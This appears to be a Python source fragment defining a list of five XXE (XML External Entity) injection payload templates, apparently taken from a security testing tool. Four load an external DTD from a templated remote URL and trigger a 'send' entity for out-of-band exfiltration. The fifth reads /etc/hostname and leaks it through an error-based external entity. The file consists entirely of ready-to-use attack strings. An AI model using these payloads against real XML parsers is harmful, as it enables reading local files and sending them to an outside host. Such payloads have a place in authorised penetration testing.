vectors = [
'''<!DOCTYPE data [
<!ENTITY % remote ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/ext.dtd">
%remote;
%send;
]>
<data>4</data>''',

'''<!DOCTYPE data [
  <!ENTITY % remote ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/ext.dtd">
  %remote;
]>
<data>&send;</data>''',

'''<!DOCTYPE data ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/ext.dtd">
<data>&send;</data>''',

'''<!DOCTYPE data [
<!ENTITY % remote ${SYSPUB} "${PROTOCOLHANDLE}${PUBLIC_URL_PLACEHOLDER}/ext.dtd">
%remote;
]>
<data attrib='&internal;'/>''',

'''<!ENTITY % payload ${SYSPUB} "file:///etc/hostname">
<!ENTITY % param1 '<!ENTITY % external ${SYSPUB} "file:///nothere/%payload;">'>
%param1;
%external;''',
]